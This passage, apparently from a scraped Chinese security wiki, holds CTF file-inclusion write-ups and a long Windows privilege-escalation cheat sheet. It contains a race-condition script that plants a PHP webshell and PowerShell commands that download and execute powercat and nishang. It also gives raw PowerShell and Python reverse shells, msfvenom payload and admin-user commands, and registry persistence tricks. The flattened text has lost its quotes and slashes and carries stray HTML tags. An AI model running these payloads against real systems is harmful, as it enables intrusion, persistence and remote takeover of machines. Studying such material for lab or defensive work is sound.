第三和第四个prefix+name将表示为session中的键名 第五个表示我们对Cookie中sessionID可控简⽽⾔之，我们可以利⽤session.upload_progress将⽊⻢写⼊session⽂件，然后包含这个session⽂件。不过前提是我们需要创建⼀个session⽂件，并且知道session⽂件的存放位置。因为session.use_strict_mode=off的关系，我们可以⾃定义sessionIDlinux系统中session⽂件⼀般的默认存储位置为 /tmp 或 /var/lib/php/session例如我们在Cookie中设置了PHPSESSID=flag，php会在服务器上创建⽂件：/tmp/sess_flag，即使此时⽤户没有初始化session，php也会⾃动初始化Session。 并产⽣⼀个键值，为prefix+name的值，最后被写⼊sess_⽂件⾥还有⼀个关键点就是session.upload_progress.cleanup默认是开启的，只要读取了post数据，就会清除进度信息，所以我们需要利⽤条件竞争来pass，写⼀个脚本来完成 import ioimport requestsimport threadingurl = http://a914fd90-ab5f-44ae-a9a7-20fb9b6d991e.challenge.ctf.show/def write(session): data = PHP_SESSION_UPLOAD_PROGRESS: ?php system(tac f*);?mumuzi while True: f = io.BytesIO(ba * 1024 * 10) response = session.post(url,cookies=PHPSESSID: flag, data=data, files=file: (muzi.txt, f))def read(session): while True: response = session.get(url+?file=/tmp/sess_flag) if mumuzi in response.text: print(response.text) break else: print(retry)if __name__ == __main__: session = requests.session() write = threading.Thread(target=write, args=(session,)) write.daemon = True write.start() read(session) 更新: 2025-09-06 15:37:39原文: https://www.yuque.com/zhuoyibeiqingcha-cndti/miwngn/eb6f6630d2eed4e7840f043ad7ed78fa"},{"path":"/wiki/WP/文件包含/有意思的点.html","content":"有意思的点先看代码?phpshow_source(__FILE__);echo $_GET[hello];$page=$_GET[page];while (strstr($page, php://)) $page=str_replace(php://, , $page);include($page);? 只过滤了php: 没有考虑大小写，也没有考虑data:按部就班的可以做出来但有一点，代码中的$_GET[‘hello’];好像没啥用，看官方WP 原来可以远程文件包含，构造入下http://192.168.100.161:50281/?page=http://127.0.0.1/index.php/?hello=%3C?system(%22ls%22);?%3E 更新: 2025-09-06 15:37:37原文: https://www.yuque.com/zhuoyibeiqingcha-cndti/miwngn/f177b12039f254f60adeeea6c26772d5"},{"path":"/wiki/WP/文件包含/协议&&伪协议.html","content":"协议伪协议file:php:input # 执行php代码php:filter # 读取源码zip: #压缩文件 1.什么是协议协议呢？就是双方都能听明白的一个沟通约定语言，比如我们说的这个普通话，那么它就是一种协议啊，有了它，我们天南海台北的人都能说一个同一个语调，那么我们东北的贵州的说话互相的才能听得懂，那么在我们计算机中呢也有很多协议 常见的网络层有 IP协议、ICMP协议、ARP协议、IGMP协议 应用层 http协议、https协议、ftp协议、ssh协议、gopher协议、qq拉起协议 2.协议的格式协议头:内容(多为二进制 3.php中的协议file: 访问本地文件系统，在不写协议名字的情况下，就默认是file协议它是支持这个路径混杂模式，什么叫做混杂模式，我们知道在linux下，路径呢一般分为什么对吧，分为相对路径和绝对路径，假设我们使用include包含网站根目录下的flag.php,实际上是包含varwwwhtmlflag.php,它会由相对路径转换为绝对路径 http: 访问 HTTP(s) 网址，可以获取远程的内容，返回到本地，也可以用包含函数包含远程文件，可以直接读取远程的php文件在本地执行，RCE。注意：包含远程文件需在php.ini中将allow_url_include设置为On。 ftp: 默认21端口，进行文件传输的协议 data: data: #执行php代码 ?urldata:textplain, **data:**base64 ?urldata:textplain;base64, 数据（RFC 2397）data: 同样类似与php:input，可以让用户来控制输入流，当它与包含函数结合时，用户输入的data:流会被当作php文件执行。从而导致任意代码执行。 phar: — PHP 归档 glob: — 查找匹配的文件路径模式 ssh2: — Secure Shell 2 rar: — RAR ogg: — 音频流 expect: — 处理交互式的流 zlib: — 压缩流 zip: bzip2: zlib: 协议： 条件：allow_url_fopen:offon allow_url_include :offon 作⽤：zip: bzip2: zlib: 均属于压缩流，可以访问压缩⽂件中的⼦⽂ 件，更重要的是不需要指定后缀名 ⽤法：zip:[压缩⽂件绝对路径]%23[压缩⽂件内的⼦⽂件名] compress.bzip2:file.bz2 compress.zlib:file.gz 其中phar:和zip:类似 更新: 2025-09-06 15:37:35原文: https://www.yuque.com/zhuoyibeiqingcha-cndti/miwngn/cfe9e1890ac940e78143e9a18520e5ad"},{"path":"/wiki/内网/提权/windows提权.html","content":"windows 提权基础知识1.用户和权限模型用户账户（User Account）：Windows 系统中，用户可以拥有不同的权限和角色。管理员账户（Administrator）：拥有系统的完全控制权限。 标准用户（Standard User）：具有受限的权限，不能对系统进行重要的更改。 受限用户（Restricted User）：权限更少，几乎不能修改系统设置。 系统账户（SYSTEM）：这是 Windows 操作系统内核的权限级别，比管理员更高。攻击者通过提升权限，往往会争取系统权限。 UAC（用户帐户控制）：Windows 的一个安全特性，用于防止恶意软件通过获得管理员权限来破坏系统。即使是管理员账户，也需要额外确认才能执行高权限操作。 2.访问控制列表 (ACL)Windows 访问控制列表（ACL）是用于控制对计算机资源（如文件、文件夹、注册表项等）访问权限的机制。它帮助定义哪些用户或组可以访问特定资源，以及他们可以执行哪些操作（如读取、写入、修改等）。ACL 由一系列 访问控制条目（ACE） 组成，每个 ACE 包含以下信息： 主体（Subject）：请求访问资源的用户、组或计算机。 访问权限掩码（Access Mask）：定义允许或拒绝的权限（如读取、写入、执行等）。 继承标志（Inheritance Flag）：指示子对象是否继承父对象的 ACL。 查看文件的 ACL： icacls 文件路径 更改文件的 ACL： icacls 文件路径 grant 用户名:权限 deny 用户名:权限 inheritance:级别 其中： grant：授予权限。 deny：拒绝权限。 inheritance：设置继承标志。 权限可以是： F：完全控制。 M：修改。 RX：读取和执行。 继承级别可以是： N：无继承。 R：只继承读取权限。 D：继承所有权限。 3.安全标识符 (SID)安全标识符（SID） 用于唯一标识用户、组或计算机。SID 是一种字符串，用来标识与资源访问相关的主体 S-1-5-18 (LocalSystem)\\ S-1-5-19 (LocalService)\\ S-1-5-20 (NetworkService)\\ S-1-5-32-544 (Administrators)\\ S-1-5-32-545 (Users)\\ S-1-5-32-550 (PrintOperators) 查询 SID wmic useraccount get name,sid SID 解析 19922 S-1-5-21-273206267-380918465-181388736-1001 Vultop S-1-5-21-1205915028-4293886087-4092552726-1001 S-1-：这是 SID 的通用前缀，表示这是一个修订版为 1 的 SID。 修订版本：SID 是为 Windows NT 4.0 及以后的版本创建的。 5：修订级别，表示这是 NT 4.0 以后的版本。 21：表示颁发 SID 的领域（在 Active Directory 环境中，通常是域的相对标识符）。 领域信息：该 SID 可能属于一个具有相对标识符（RID）为 “21” 的域。 1205915028：颁发机构的安全标识符（通常是一个 GUID）。 颁发机构：由具有 GUID “1205915028” 的颁发机构创建。 4293886087 和 4092552726：表示与颁发机构 SID 相关联的子权威值。 子权威值：说明 SID 如何进一步细分和管理。 1001：这是特定主体的唯一标识符，如用户、组或服务账户。 唯一标识符：最后的数字（如 “1001”）标识特定的用户或服务账户。 针对 S-1-5-21-1004336348-1177238915-682003330-512进行解析，可以知道 SID 的版本号是 1\\ 主标识值是 5，代表 NT 权限\\ 域相关的子标识值是 21-1004336348-1177238915-682003330\\ RID 是 512，代表 DomainAdmins 4.基本命令 命令 描述 systeminfo 打印系统信息 whoami 获取当前用户名 whoami /priv 列出当前帐户权限 ipconfig 网络配置信息 ipconfig /displaydns 显示 DNS 缓存 route print 打印路由表 arp -a 打印 ARP 表 hostname 获取主机名 net user 列出用户 net localgroup 列出所有组 net view \\127.0.0.1 列出打开到当前计算机的会话 net session 列出其他机器打开的会话 netsh firewall show config 显示防火墙配置 DRIVERQUERY 列出已安装的驱动 tasklist /svc 列出服务任务 net start 列出启动的服务 dir /s foo 在目录中搜索包含指定字符的项目 sc query 列出所有服务 sc qc ServiceName 找到指定服务的路径 shutdown /r /t 0 立即重启 type file.txt 打印文件内容 icacls C:\\Example 列出权限 wmic qfe get Caption,Description,HotFixID,InstalledOn 列出已安装的补丁 (New-Object System.Net.WebClient).DownloadFile(http://host/file,C:\\LocalPath) 利用 PowerShell 远程下载文件到本地 accesschk.exe -qwsu Group 修改对象权限 $ query user #查看用户登陆情况$ whoami #当前用户权限$ set #环境变量$主机名 #主机名$ systeminfo #查看当前系统版本与补丁信息$ ver #查看当前服务器操作系统版本$ net user #查看用户信息$ net start #查看当前计算机开启服务名称$ netstat -ano #查看端口情况$ netstat -ano|find 3389 #查看指定端口$ tasklist #查看所有进程占用的端口$ taskkil /im xxx.exe /f #强制结束指定进程$ taskkil -PID pid # 结束某个pid号的进程$ tasklist /svc|find TermService # 查看服务pid号$ wmic os get title # 查看系统名$ wmic Product get name,version # 查看当前安装程序$ wmic qfe get Description,HotFixID,InstalledOn # 查看补丁信息$ wmic qfe get Description,HotFixID,InstalledOn | 强制结束指定进程$ findstr /C: KB4346084 /C: KB4509094 # 定位特定补丁#添加管理员用户$ net user username(用户名) password(密码) /add # 添加普通用户$ net localgroup adminstrators username /add # 把普通用户添加到管理员用户组#如果远程桌面连接不上可以添加远程桌面组$ net localgroup Remote Desktop Users username / add 项目（Item） 命令检查项（CommandCheck） 目的（Why） 系统与补丁（System Patches） systeminfo；wmic qfe get 确定操作系统版本、安装日期及已安装的热修复补丁（hotfixes）。 当前身份与权限（Current Identity Privileges） whoami；whoami /priv；whoami /all 识别当前用户令牌、权限（如SeImpersonate、SeDebug等）及用户组信息。 用户与组（Users Groups） net user；net localgroup administrators 枚举本地用户、管理员组成员。 服务与启动项（Services Startup） sc query state=all；sc qc 服务名 查找服务、启动模式及二进制路径。 计划任务（Scheduled Tasks） schtasks /query /fo LIST /v 枚举计划任务及详细信息。 文件系统与ACL（File System ACL） icacls C:\\Windows\\System32；icacls [敏感目录] 识别可写入的敏感目录或ACL权限配置错误。 注册表项（读取）（Registry Keys (read)） reg query HKLM\\SYSTEM\\CurrentControlSet\\Services；reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run 导出服务键值、自动运行（AutoRun）条目等。 进程与镜像路径（Processes Image Paths） tasklist /v；wmic process get name,executablepath 识别特权进程及可执行文件路径。 环境变量（Environment Variables） set 检查PATH、TEMP、PSModulePath等是否存在可劫持的条目。 事件日志Sysmon（Event Logs Sysmon） wevtutil qe Security /q:* /f:text；Get-WinEvent -LogName Microsoft-Windows-Sysmon/Operational（PowerShell） 收集进程创建、服务变更等日志；若存在Sysmon，则检查其事件。 UAC防御软件EDR状态（UAC Defender EDR state） reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\EnableLUA（检查UAC）；Get-MpComputerStatus（PowerShell，检查Defender状态） 了解防御态势（如UAC是否启用、DefenderEDR状态）及可用的缓解措施。 5.常用命令 类别 命令 主要参数 功能描述 文件管理 dir /s 递归搜索子目录 /b 简明格式(仅路径和文件名) /a:[d h /p 分页显示 /w 宽列表格式 copy /y 覆盖时不提示 /v 验证文件写入正确性 xcopy /e 复制目录和子目录(含空目录) /h 复制隐藏和系统文件 robocopy /mir 镜像目录树(同步删除) /mt:n 多线程复制(n线程数) del /f 强制删除只读文件 /s 从所有子目录删除指定文件 进程管理 tasklist /v 详细模式(显示更多信息) /svc 显示进程包含的服务 /m [module] 显示加载的DLL模块 /fi filter 过滤器条件 taskkill /im name 按映像名称结束进程 /pid id 按进程ID结束进程 /f 强制终止进程 /t 终止子进程 网络诊断 ping -t 持续ping直到手动停止 -n count 指定发送请求次数 -l size size 发送缓冲区大小 -w timeout 超时时间(毫秒) ipconfig all 显示完整配置信息 release 释放IP地址租约 renew 续订IP地址租约 flushdns 清除DNS解析缓存 displaydns 显示DNS解析缓存内容 netstat -a 显示所有连接和监听端口 -n 以数字形式显示地址和端口号 -b 显示创建连接的应用程序 -o 显示拥有的进程ID tracert -d 不将地址解析成主机名 -h max_hops 搜索目标的最大跃点数 磁盘管理 chkdsk f 修复磁盘上的错误 r 定位坏扇区并恢复可读信息 x 必要时强制卸载卷 format fs:type 指定文件系统(FAT32/NTFS) q 快速格式化 a:size 分配单元大小 系统服务 sc query 查询服务状态 start 启动服务 stop 停止服务 create 创建服务 系统信息 systeminfo fo format 指定输出格式(table/list/csv) sfc scannow 立即扫描所有受保护的系统文件 verifyonly 扫描但不修复 FTP传输 ftp -i 关闭交互模式 -s:file 执行指定文件中的ftp命令 -v 禁止显示远程服务器响应 注册表 reg query 查询注册表键值 add 添加新的注册表项 delete 删除注册表项 用户账户 net user username add 添加用户账户 username delete 删除用户账户 username password 更改用户密码 计划任务 schtasks create 创建新计划任务 delete 删除计划任务 query` 显示所有计划任务 Windows反弹shell Win 192.168.129.161 KaLi 192.168.129.152powercat kali nc -lvp 5555 windows powershell -ExecutionPolicy Bypass -Command “$content Invoke-RestMethod ‘https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1; Invoke-Expression $content; powercat -c 192.168.129.152 -p 5555 -e cmd” 解释： powershell这是调用 PowerShell 的命令。在 Windows 的命令提示符（cmd）中，你可以通过 powershell 命令启动 PowerShell 环境。 -ExecutionPolicy Bypass这是一个重要的参数，用于绕过 PowerShell 的执行策略限制。默认情况下，PowerShell 会限制运行未签名的脚本，以防止恶意脚本的执行。-ExecutionPolicy Bypass 选项允许你临时绕过这些限制，只在当前会话中运行指定的命令。 -Command这个参数用于指定要执行的 PowerShell 命令。你可以将多个命令放在一个字符串中，用分号 ; 分隔。这些命令将在同一个 PowerShell 会话中依次执行。 $ content Invoke-RestMethod ‘https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1 ‘$content：这是一个变量，用于存储从网络下载的内容。Invoke-RestMethod：这是一个 PowerShell 命令，用于从指定的 URL 下载内容。它会返回下载的内容，而不是保存到文件。‘https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1 ‘：这是 powercat.ps1 脚本的 GitHub 原始链接。Invoke-RestMethod 会从这个 URL 下载脚本内容。 Invoke-Expression $ contentInvoke-Expression：这是一个 PowerShell 命令，用于执行字符串中的 PowerShell 命令。在这个例子中，它会执行从 GitHub 下载的 powercat.ps1 脚本内容。$content：这是之前下载的脚本内容。Invoke-Expression 会将这些内容作为 PowerShell 令执行。 powercat -c 192.168.129.152 -p 5555 -e cmdpowercat：这是 powercat.ps1 脚本中的一个命令，用于建立网络连接。-c 192.168.129.152：指定要连接的目标 IP 地址。-p 5555：指定要连接的目标端口号。-e cmd：指定在建立连接后执行的命令。在这个例子中，cmd 表示启动 Windows 的命令提示符（cmd.exe）。 nishang kali nc -lvp 5555 windows powershell -ExecutionPolicy Bypass -Command “IEX (New-Object Net.WebClient).DownloadString(‘https://raw.githubusercontent.com/samratashok/nishang/9a3c747bcf535ef82dc4c5c66aac36db47c2afde/Shells/Invoke-PowerShellTcp.ps1);;) Invoke-PowerShellTcp -Reverse -IPAddress 192.168.129.152 -Port 5555” 解释 自定义powershell函数反弹shell kali nc -lvp 5555 win powershell版本 powershell -nop -c “$client New-Object Net.Sockets.TCPClient(‘192.168.129.152’,5555);$stream $client.GetStream(); [byte[]]$bytes 0..65535|%{0};while(($i $stream.Read($bytes, 0, $bytes.Length)) -ne 0){; $data (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback (iex $data 21 | Out-String ); $sendback2 $sendback + ‘PS ‘ + (pwd).Path + ‘ ‘;$sendbyte ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()” powershell -nop -c: powershell: 调用 PowerShell。 -nop: 简写为 -NoProfile，表示不加载用户配置文件。这可以加快启动速度，并避免配置文件中的设置影响脚本运行。 -c: 简写为 -Command，表示执行指定的命令。 $client = New-Object Net.Sockets.TCPClient(192.168.129.152,5555): 创建一个 TCPClient 对象，用于建立 TCP 连接。 192.168.129.152: 目标服务器的 IP 地址。 5555: 目标服务器的端口号。 $stream = $client.GetStream(): 获取 TCPClient 的网络流（NetworkStream），用于读取和写入数据。 [byte[]]$bytes = 0..65535|%{0}: 创建一个大小为 65536 的字节数组，用于存储从网络流中读取的数据。 0..65535: 生成一个从 0 到 65535 的数字序列。 |%{0}: 对每个数字生成一个值为 0 的字节。 while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0): 从网络流中读取数据，直到没有更多数据可读。 $stream.Read($bytes, 0, $bytes.Length): 从网络流中读取数据到 $bytes 数组中，返回读取的字节数。 -ne 0: 检查是否读取到数据（即返回值不为 0）。 $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i): 将读取的字节转换为字符串。 System.Text.ASCIIEncoding: 使用 ASCII 编码将字节转换为字符串。 $i: 读取的字节数。 $sendback = (iex $data 21 | Out-String ): 执行从网络流中读取的命令，并捕获输出。 iex $data: 使用 Invoke-Expression（iex）执行 $data 中的命令。 21: 将错误输出重定向到标准输出。 | Out-String: 将输出转换为字符串。 $sendback2 = $sendback + PS + (pwd).Path + : 构造返回的字符串，包括命令的输出和当前路径。 $sendback: 命令的输出。 PS + (pwd).Path + : 当前路径提示符。 $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2): 将返回的字符串转换为字节数组。 $stream.Write($sendbyte,0,$sendbyte.Length): 将返回的字节写回网络流。 $stream.Flush(): 刷新网络流，确保所有数据都已发送。 $client.Close(): 关闭 TCP 客户端。 cmd版本 powershell -nop -c “$client New-Object Net.Sockets.TCPClient(‘192.168.129.152’,5555);$stream $client.GetStream(); [byte[]]$bytes 0..65535|%{0};while(($i $stream.Read($bytes, 0, $bytes.Length)) -ne 0){; $data (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback (cmd c $data 21 | Out-String ); $sendback2 $sendback + ‘CMD ‘ + (pwd).Path + ‘ ‘;$sendbyte ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()” MSF反弹 msfvenom -p windowsmeterpreterreverse_tcp LHOST192.168.129.152 LPORT5555 -f exe -o shell.exe（msf 本地IP） msf6 use exploit/multi/handler[*] Using configured payload generic/shell_reverse_tcpmsf6 exploit(multi/handler) set payload windows/meterpreter/reverse_tcppayload = windows/meterpreter/reverse_tcp(show options)msf6 exploit(multi/handler) set lhost 192.168.129.152lhost = 192.168.183.142msf6 exploit(multi/handler) set lport 5555lport = 4444msf6 exploit(multi/handler) exploit[*] Started reverse TCP handler on 192.168.129.152:5555 创建meterpreter会话后 execute -H -i -f cmd.exe python反弹shell kali nc -lvp 5555 win # -*- coding:utf-8 -*-import osimport selectimport socketimport sysimport subprocessdef ReserveConnect(addr, port): 反弹连接shell try: shell = socket.socket(socket.AF_INET, socket.SOCK_STREAM) shell.connect((addr,port)) except Exception as reason: print ([-] Failed to Create Socket : %s%reason) exit(0) rlist = [shell] wlist = [] elist = [shell] while True: shell.send(cmd:.encode()) rs,ws,es = select.select(rlist,wlist,wlist) for sockfd in rs: if sockfd == shell: command = shell.recv(1024) if command == exit: shell.close() break result, error = subprocess.Popen(command,shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE).communicate() shell.sendall(result.decode(GB2312).encode(UTF-8))# 主函数运行def run(): if len(sys.argv)3: print(Usage: python reverse.py [IP] [PORT]) else: url = sys.argv[1] port = int(sys.argv[2]) ReserveConnect(url,port)if __name__ == __main__: run() - 执行python reverse_win.py 127.0.0.1 5555 Windows 内核溢出漏洞一：手工 systeminfo python wes.py sys.txt https://github.com/bitsadmin/wesng 查找内核提权exp https://github.com/k8gege/Ladon \\ https://github.com/Ascotbe/KernelHub \\ https://github.com/nomi-sec/PoC-in-GitHub \\ https://github.com/offensive-security/exploitdb \\ http://cve.mitre.org/data/refs/refmap/source-MS.html 二:msf自动(反弹shell后) postwindowsgatherenum_patches(半自动，还得自己找,找出系统中缺少的补丁) bg use postwindowsgatherenum_patches set session 1 run postmultireconlocal_exploit_suggester(全自动) bg use postmultireconlocal_exploit_suggester. set session 1 run 找到绿色的，可用的,一个一个试 用第一个试试 use exploitwindowslocalalways_install_elevated set session 1 换一个不一样的端口，然后，另外打开一个msf,监听这个端口 错误的系统配置提权1.不安全的服务权限查询服务的配置： sc.exe qc name 查询服务的当前状态： sc.exe query name 修改服务的配置选项： sc.exe config name option= value 开始停止服务： net start/stop name accesschk.exe用法介绍 命令 查看用户用户组对文件文件夹的权限 accesschk 用户用户组文件件夹 列出所有服务的权限 accesschk.exe -ucqv * 查看用户用户组具有写权限的服务 accesschk用户用户组 -cw * 要查看用户用户组对 HKEY LOCAL MACHINE、Software目录下注册表项的权限 accesschk-k用户用户组 hkl\\software 查看每个人都可以修改的全局对象 accesschk -wuo everyone font - 反弹shell- 用winPEASany.exe 检查font style=color:rgb(36, 41, 47);服务配置错误 .\\winPEASany.exe quiet servicesinfo/font- font style=color:rgb(36, 41, 47);查看是否有手工修改的服务/font- font style=color:rgb(36, 41, 47);.\\accesschk.exe /accepteula -uwcqv user 服务/font- font style=color:rgb(36, 41, 47);检查用户或组是否有权访问文件，目录，服务和注册表项/font- font style=color:rgb(36, 41, 47);sc qc 服务 /font- font style=color:rgb(36, 41, 47);检查当前配置/font- font style=color:rgb(36, 41, 47);sc config /fontfont style=color:rgb(36, 41, 47);服务/fontfont style=color:rgb(36, 41, 47); binpath= \\C:\\Users\\user\\Desktop\\a002.exe\\ /font- font style=color:rgb(36, 41, 47);重新配置服务使我们反向shell/font- font style=color:rgb(36, 41, 47);net start /fontfont style=color:rgb(36, 41, 47);服务/font- font style=color:rgb(36, 41, 47);启动服务触发漏洞反弹shell/font 2.未引用的服务路径1.运行winPEAS以检查服务配置错误：.\\winPEASany.exe quiet servicesinfo 2. 发现”unquotedsvc”服务有一个未引用的路径 ，其中也 包含 空格：C:\\Program Files\\Unquoted Path Service\\Common Files\\unquotedpathservice.exe 3. 使用sc确认此问题：sc qc unquotedsvc 4.使用accesschk.exe检查写入权限：.\\accesschk.exe /accepteula -uwdq C:\\ .\\accesschk.exe /accepteula -uwdq C:\\Program Files\\ .\\accesschk.exe /accepteula -uwdq C:\\Program Files\\Unquoted Path Service\\ 1. .\\accesschk.exe /accepteula -uwdq C:\\**功能 功能：扫描 C 盘根目录下的所有文件和文件夹参数含义：/accepteula：自动接受最终用户许可协议-u：只显示当前用户的权限-w：只显示有写入权限的项目-d：显示目录权限-q：静默模式，不显示横幅2. .\\accesschk.exe /accepteula -uwdq C:\\Program Files\\功能：扫描 Program Files 目录及其子目录目的：找出当前用户在 Program Files 中有写入权限的位置3. .\\accesschk.exe /accepteula -uwdq C:\\Program Files\\Unquoted Path Service\\功能：专门扫描特定服务目录特点：这是一个典型的未加引号的服务路径示例 5.复制可执行的反向外壳并适当重命名copy C:\\Users\\user\\Desktop\\a002.exe C:\\Program Files\\Unquoted Path Service\\Common.exe 系统会按以下顺序查找可执行文件：C:\\Program.exeC:\\Program Files\\Unquoted.exeC:\\Program Files\\Unquoted Path.exeC:\\Program Files\\Unquoted Path Service\\Common.exe 6.启动服务触发漏洞进行反弹shellnet start unquotedsvc 3.注册表权限弱 由于注册表条目可能具有 ACL，如果 ACL 配置错误，即使我们不能直接修改服务，也有可能修改服务的配置 4.不安全的服务可执行5.msf攻击模块需要提前获取一个session exploitwindowslocalservice_permissions exploitwindowslocalunquoted_service_path 注册表Windows 注册表是一个庞大的配置数据库，存储了系统和应用程序的配置信息。由于其重要性，注册表中的漏洞经常成为攻击者的目标。HKEY_CLASSES_ROOT（HKCR）：存储文件类型关联、COM 对象等信息，用于决定系统如何处理不同类型的文件。例如，当双击一个.docx 文件时，系统会依据此分支中的信息调用相应的程序（如 Word）来打开它。 HKEY_CURRENT_USER（HKCU）：包含当前登录用户的个性化设置，如桌面布局、浏览器书签、应用程序偏好设置等。每个用户登录时，系统会加载属于该用户的此分支数据。 HKEY_LOCAL_MACHINE（HKLM）：存储与本地计算机相关的系统设置，这些设置对所有用户都生效，包括硬件配置、软件安装信息、系统服务配置等。例如，安装的打印机驱动程序信息就存储在此分支。 HKEY_USERS：包含所有已登录用户的配置文件，HKCU 实际上是 HKEY_USERS 下对应当前登录用户的子键的映射。 HKEY_CURRENT_CONFIG（HKCC）：存储当前硬件配置文件的相关信息，这些信息是系统在启动时根据硬件设备情况动态生成的。 1 自启动项Windows 启动时会自动运行某些注册表项中的程序。攻击者可以添加或修改这些项，以便在系统启动时执行恶意代码。 示例： reg add “HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run” v “Malicious” t REG_SZ d “C:\\malicious.exe” f 2 服务配置中的 ImagePath某些服务的可执行文件路径存储在注册表中。攻击者可以通过修改这些路径来执行恶意代码。 示例： reg add “HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\VulnerableService” v ImagePath t REG_SZ d “C:\\malicious.exe” f 修改后，重新启动服务以执行恶意代码： sc stop VulnerableServicesc start VulnerableService 3 AlwaysInstallElevatedAlwaysInstallElevated 是一种允许非管理员用户以 SYSTEM 权限运行 MSI 文件的设置。通过查询以下、注册表项，可以检查该设置是否启用： reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevatedreg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated.\\winPEASany.exe quiet windowscreds 查看是否设置了两个注册表值 如果该设置启用，可以利用它来执行恶意 MSI 文件： msiexec i malicious.msi msf use exploitwindowslocalalways_install_elevated(先反弹shell) 如果失败了我们可以使用MSF生成 msi文件然后上传上去运行即可 msfvenom -p windowsmeterpreterreverse_tcp LHOST192.168.0.106 LPORT6789 -f msi -o payload.msi 建立一个新的监听(上面的那个会话不要关掉) 将msi文件通过shell传上去 upload payload.msi execute “msiexec.exe quiet qn i payload.msi” 创建一个具有管理员权限的用户通过恶意 MSI 文件，攻击者可以创建一个具有管理员权限的新用户。以下是创建恶意 MSI 文件的步骤： msfvenom -p windowsadduser USERhacker PASSPassword123 -f msi -o adduser.msi 执行 MSI 文件创建新用户： msiexec i adduser.msi 这个命令将在系统中创建一个名为 “hacker” 的用户，并赋予管理员权限。 提取敏感信息攻击者可以创建一个 MSI 文件，用于提取系统中的敏感信息，如密码哈希或注册表键值。以下是一个示例： msfvenom -p windowsgatherhashdump -f msi -o hashdump.msi 执行 MSI 文件提取密码哈希： msiexec i hashdump.msi 这个命令将提取系统中的密码哈希，并将其发送到指定的远程服务器。 运行 PowerShell 脚本攻击者可以利用 MSI 文件运行复杂的 PowerShell 脚本，以执行多步骤的攻击。以下是创建一个运行 PowerShell 脚本的恶意 MSI 文件： msfvenom -p windowspowershell_exec -f msi -o ps_script.msi CMD”powershell -ExecutionPolicy Bypass -File C:\\malicious.ps1” 执行 MSI 文件运行 PowerShell 脚本： msiexec i ps_script.msi 这个命令将以 SYSTEM 权限运行指定的 PowerShell 脚本。 4 注册表键权限某些注册表键可能配置了不安全的权限，允许低权限用户修改或删除这些键。攻击者可以利用这一点来更改系统配置或植入恶意代码。 示例： icacls “HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\VulnerableService” grant Everyone:F 修改注册表键后，重新启动服务或系统以执行恶意代码。 5 安全描述符定义语言（SDDL）注册表项的安全描述符定义语言（SDDL）字符串定义了谁可以访问该项。攻击者可以修改 SDDL 字符串以获得对某些注册表项的完全控制权。 示例： reg add “HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\VulnerableService” t REG_SZ v “Security” d “D:(A;;GA;;;WD)” f 此命令将注册表项的权限设置为允许所有用户完全控制。 6 环境变量劫持Windows 系统中的某些环境变量值存储在注册表中，攻击者可以通过修改这些值来劫持系统行为。 示例： reg add “HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment” v “Path” t REG_EXPAND_SZ d “C:\\malicious;%” f 此命令将环境变量 Path 修改为包含恶意路径，从而劫持系统中运行的程序。 7 注册表钩子攻击者可以在注册表中添加钩子，使得当某些注册表项被访问时，恶意代码会被执行。 示例： reg add “HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\target.exe” v “Debugger” t REG_SZ d “C:\\malicious.exe” f 此命令会使target.exe在每次执行时都启动malicious.exe。 8 AppInit_DLLs 注入通过修改AppInit_DLLs注册表项，攻击者可以将 DLL 注入到所有进程中，从而获得系统控制权。 示例： reg add “HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows” v “AppInit_DLLs” t REG_SZ d “C:\\malicious.dll” f 此命令会在所有进程启动时加载malicious.dll。 9 启动与恢复设置攻击者可以修改系统的启动与恢复设置，以便在系统崩溃时执行恶意代码。 示例： reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\CrashControl /v AutoReboot /t REG_DWORD /d 0 /freg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\CrashControl /v DumpFile /t REG_EXPAND_SZ /d C:\\malicious.dmp /f 此命令会将系统崩溃后的转储文件路径设置为恶意文件。 通过这些方法，攻击者可以利用注册表中的配置错误和权限漏洞，进行权限提升和系统控制。安全人员应特别注意注册表的配置和权限管理，以防范潜在的攻击。 组策略组策略首选项postwindowsgathercredentialsgpp 绕过UAC它是Windows的一个安全功能，它支持防止对操作系统进行未经授权的修改，UAC确保仅在管理员授权的情况下进行某些更改。如果管理员不允许更改，则不会执行这些更改，并且Windows系统保持不变。 一些没有管理员权限无法完成的操作： 注册表修改（如果注册表项在HKEY_LOCAL_MACHINE下（因为它影响多个用户），它将是只读的） 加载设备驱动程序 DLL注入 修改系统时间（时钟） 修改用户帐户控制设置（通过注册表，可以启用禁用该设置，但您需要正确的权限才能执行此操作） 修改受保护的目录（例如Windows文件夹，Program Files） 计划任务（例如，以管理员权限自动启动） 